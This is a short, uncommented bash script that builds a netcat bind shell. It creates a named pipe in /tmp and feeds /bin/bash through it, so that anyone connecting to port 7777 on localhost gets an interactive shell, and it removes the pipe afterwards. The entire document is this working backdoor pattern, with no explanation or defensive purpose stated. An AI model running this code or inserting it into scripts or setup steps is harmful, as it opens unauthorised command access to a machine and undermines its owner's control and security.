#!/bin/bash
mkfifo /tmp/f 
cat /tmp/f | /bin/bash 2>&1 | nc localhost -l 7777 > /tmp/f \ 
    && rm /tmp/f

